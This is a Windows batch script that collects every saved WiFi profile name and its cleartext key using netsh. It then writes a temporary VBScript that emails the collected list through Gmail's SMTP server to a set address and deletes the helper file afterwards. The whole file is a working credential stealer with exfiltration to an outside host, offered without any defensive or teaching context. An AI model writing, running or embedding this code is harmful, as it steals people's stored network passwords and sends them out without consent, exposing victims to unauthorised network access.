@ECHO OFF 

setlocal enableDelayedExpansion
set /a c=0
for /F delims^=^ eol^= %%r in ('netsh wlan show profiles') DO (
	set /A c+=1
		If !c! GEQ 7 ( 
			FOR /f "tokens=2 delims=:" %%i in ("%%r") DO (
			for /f "tokens=* delims= " %%a in ("%%i") do (
				set /a c1=0
				for /F delims^=^ eol^= %%s in ('netsh wlan show profiles "%%a" key"="clear') DO (
					set /A c1+=1
					If !c1! == 28 (
						FOR /f "tokens=2 delims=:" %%m in ("%%s") DO for /f "tokens=* delims= " %%p in ("%%m") do set "pass=%%a : %%p  |    !pass!"
						)
					)
				
				)
			)
		)
	)
set Port=465
set SSL=True
set From="username@gmail.com"
set To="tomail@gmail.com"
set Subject="WiFi SSIDs and Passwords"
set Body="%pass%"
set SMTPServer="smtp.gmail.com"
set User="username"
set Pass="password"

if "%~7" NEQ "" (
set From="%~1"
set To="%~2"
set Subject="%~3"
set Body="%~4"
set SMTPServer="%~5"
set User="%~6"
set Pass="%~7"
set fileattach="%~8"
)

set "vbsfile=%temp%\email-bat.vbs"
del "%vbsfile%" 2>nul
set cdoSchema=http://schemas.microsoft.com/cdo/configuration
echo >>"%vbsfile%" Set objArgs       = WScript.Arguments
echo >>"%vbsfile%" Set objEmail      = CreateObject("CDO.Message")
echo >>"%vbsfile%" objEmail.From     = %From%
echo >>"%vbsfile%" objEmail.To       = %To%
echo >>"%vbsfile%" objEmail.Subject  = %Subject%
echo >>"%vbsfile%" objEmail.Textbody = %body%
::if exist %fileattach% echo >>"%vbsfile%" objEmail.AddAttachment %fileattach%
echo >>"%vbsfile%" with objEmail.Configuration.Fields
echo >>"%vbsfile%"  .Item ("%cdoSchema%/sendusing")        = 2 ' not local, smtp
echo >>"%vbsfile%"  .Item ("%cdoSchema%/smtpserver")       = %SMTPServer%
echo >>"%vbsfile%"  .Item ("%cdoSchema%/smtpserverport")   = %port%
echo >>"%vbsfile%"  .Item ("%cdoSchema%/smtpauthenticate") = 1 ' cdobasic
echo >>"%vbsfile%"  .Item ("%cdoSchema%/sendusername")     = %user%
echo >>"%vbsfile%"  .Item ("%cdoSchema%/sendpassword")     = %pass%
echo >>"%vbsfile%"  .Item ("%cdoSchema%/smtpusessl")       = %SSL%
echo >>"%vbsfile%"  .Item ("%cdoSchema%/smtpconnectiontimeout") = 30
echo >>"%vbsfile%"  .Update
echo >>"%vbsfile%" end with
echo >>"%vbsfile%" objEmail.Send

cscript.exe /nologo "%vbsfile%"
echo email sent (if variables were correct)
del "%vbsfile%" 2>nul
goto :EOF

